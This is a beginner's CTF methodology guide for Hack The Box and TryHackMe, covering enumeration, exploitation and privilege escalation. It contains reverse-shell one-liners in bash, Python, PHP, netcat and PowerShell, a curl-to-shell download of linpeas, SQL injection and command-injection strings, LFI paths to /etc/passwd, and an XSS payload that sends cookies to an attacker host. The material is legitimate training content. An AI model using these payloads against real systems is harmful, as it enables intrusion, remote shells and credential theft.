---
domain: "CTF / Capture The Flag"
section: "approach"
tags: [ctf, hackthebox, tryhackme, methodology, beginner]
---

# CTF Approach Guide

A **Capture The Flag (CTF)** competition is a cybersecurity challenge where participants find hidden strings called "flags" by exploiting vulnerabilities, solving puzzles, or analyzing data. CTFs are the closest thing to a flight simulator for security work — safe, legal, and designed to teach. If you want hands-on security skills and you're not doing CTFs, you're leaving the best training tool on the table.

---

## Overview

CTFs come in two main formats:

**Jeopardy-style** — individual challenges organized by category (web, crypto, forensics, pwn, reverse engineering, misc). Solve a challenge, get a flag, earn points. Most online CTFs are this format.

**Attack/Defense** — teams run services and attack each other's infrastructure simultaneously. More realistic, much harder to enter as a beginner.

**Practice platforms (always-on, not time-limited):**
- **Hack The Box (HTB)** — retired machines with community writeups; active machines require you to find the solution yourself. The gold standard.
- **TryHackMe (THM)** — more guided, better for absolute beginners, rooms walk you through concepts
- **PicoCTF** — beginner-friendly, run by Carnegie Mellon, excellent for fundamentals
- **CTFtime.org** — calendar of upcoming CTF competitions worldwide
- **PortSwigger Web Academy** — the best free resource for web application security; Burp Suite creators

---

## The Standard HTB/THM Workflow

Every box, every time:

```bash
# 1. Create a working directory
mkdir -p ~/htb/<boxname>/{nmap,exploits,loot}
cd ~/htb/<boxname>

# 2. Initial nmap scan
nmap -sC -sV -oA nmap/initial <IP>

# 3. Full port scan in background
nmap -p- -T4 --open <IP> -oA nmap/allports &

# 4. Based on results, enumerate services
# (see service-specific enumeration below)

# 5. Get a foothold
# 6. Enumerate for privilege escalation
# 7. Escalate
# 8. Loot flags
cat /home/*/user.txt
cat /root/root.txt
```

---

## Service Enumeration Cheatsheet

### HTTP / HTTPS (ports 80, 443, 8080, 8443)

```bash
# Directory brute force
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Web scanner
nikto -h http://<IP>

# Technology fingerprinting
whatweb http://<IP>

# Check robots.txt and sitemap.xml manually
curl http://<IP>/robots.txt
curl http://<IP>/sitemap.xml

# Subdomain enumeration
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# If WordPress
wpscan --url http://<IP> --enumerate p,u
```

### SMB (ports 139, 445)

```bash
# Enumerate shares (anonymous)
smbclient -L //<IP> -N
crackmapexec smb <IP> --shares -u '' -p ''

# Connect to a share
smbclient //<IP>/sharename -N

# Full enumeration
enum4linux -a <IP>

# Check for EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 <IP>
```

### FTP (port 21)

```bash
# Anonymous login
ftp <IP>
# username: anonymous
# password: (blank or email address)

# Or
curl ftp://<IP>/ --user anonymous:anonymous
```

### SSH (port 22)

```bash
# Version check (look up CVEs for older versions)
nc <IP> 22

# If you have credentials
ssh user@<IP>

# If you have a private key
chmod 600 id_rsa
ssh -i id_rsa user@<IP>
```

### MySQL (port 3306)

```bash
mysql -h <IP> -u root -p
# Try blank password, root, toor, password

# If accessible
show databases;
use <database>;
show tables;
select * from users;
```

---

## Getting a Shell

**Reverse shell one-liners** (set up listener first with `nc -lvnp 4444`):

```bash
# Bash
bash -i >& /dev/tcp/<your-IP>/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<your-IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (if -e is available)
nc <your-IP> 4444 -e /bin/sh

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<your-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Upgrade a basic shell to interactive TTY:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Linux Privilege Escalation

```bash
# Automated
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Sudo rights
sudo -l

# SUID binaries (cross-reference with GTFOBins)
find / -perm -4000 2>/dev/null

# Writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Capabilities
getcap -r / 2>/dev/null

# Interesting files
find / -name "*.conf" -readable 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null

# Check GTFOBins for any SUID/sudo binary
# https://gtfobins.github.io/
```

**GTFOBins** is the most important resource for Linux privesc. If you can run a binary as sudo or it has the SUID bit, GTFOBins shows how to abuse it to escalate.

---

## Windows Privilege Escalation

```powershell
# Automated
.\winpeas.exe

# Current privileges
whoami /priv
whoami /groups

# System info (check for unpatched kernel)
systeminfo

# Scheduled tasks
schtasks /query /fo LIST /v

# Services with weak permissions
.\accesschk.exe -uwcqv "Everyone" *

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Web Application Challenges

### SQL Injection

```bash
# Test for injection
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
admin'--

# Automated
sqlmap -u "http://<IP>/login.php" --data="user=test&pass=test" --dbs
sqlmap -u "http://<IP>/page.php?id=1" --dbs --batch
```

### XSS

```javascript
// Basic test
<script>alert(1)</script>

// Cookie stealing
<script>document.location='http://<your-IP>/steal?c='+document.cookie</script>

// If angle brackets are filtered
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### LFI (Local File Inclusion)

```bash
# Basic
http://<IP>/page.php?file=../../../etc/passwd
http://<IP>/page.php?file=/etc/passwd

# Null byte (older PHP)
http://<IP>/page.php?file=../../../etc/passwd%00

# PHP wrappers
http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php
```

### Command Injection

```bash
# Test characters
; id
| id
&& id
|| id
`id`
$(id)

# Bypass spaces
{id}
$IFS
```

---

## CTF Categories Quick Reference

**Forensics:**
- `file <filename>` — identify file type
- `strings <filename>` — extract readable strings
- `binwalk <filename>` — find embedded files
- `exiftool <filename>` — extract metadata
- `steghide extract -sf <image>` — extract hidden data from image
- `foremost <file>` — file carving

**Cryptography:**
- Identify cipher type first (Caesar, Vigenere, RSA, AES, XOR)
- [CyberChef](https://gchq.github.io/CyberChef/) — browser-based crypto toolkit
- [dCode.fr](https://www.dcode.fr/) — cipher identifier and solvers
- `hashid <hash>` — identify hash type
- `hashcat`, `john` — crack hashes

**Reverse Engineering:**
- `file <binary>` — identify type
- `strings <binary>` — look for hardcoded flags/credentials
- `ltrace <binary>` — library call trace
- `strace <binary>` — system call trace
- Ghidra, IDA Free — decompilers
- `gdb` — debugger

**OSINT:**
- Reverse image search (Google, TinEye, Yandex)
- [OSINT Framework](https://osintframework.com/)
- Exif data from images
- Google dorking: `site:`, `filetype:`, `inurl:`, `intitle:`

---

## VIRGIL as CTF Companion

When you're stuck on a challenge, describe what you see to VIRGIL:

- "I have an nmap scan showing ports 22, 80, and 8080 open on a Linux box. Port 80 shows a login page. How do I approach this?"
- "I found a file called backup.zip but it's password protected. What are my options?"
- "The web app has a search function. I tried `' OR '1'='1` and got a database error. What next?"
- "I have a low-privilege shell on a Linux box. `sudo -l` shows I can run `/usr/bin/python3` as root. What do I do?"

VIRGIL will walk you through the next step — not give you the flag, but illuminate the path. Like Virgil in the Inferno: *"I have come to lead you to the other shore."*

---

## Related Topics

[[Penetration Testing]], [[Nmap]], [[Metasploit]], [[Burp Suite]], [[SQL Injection]], [[Cross-Site Scripting (XSS)]], [[Privilege Escalation]], [[Wireshark]], [[OWASP Juice Shop]], [[Blue Team Fundamentals]], [[Digital Forensics]], [[Steganography]], [[Cryptography]], [[Reverse Engineering]]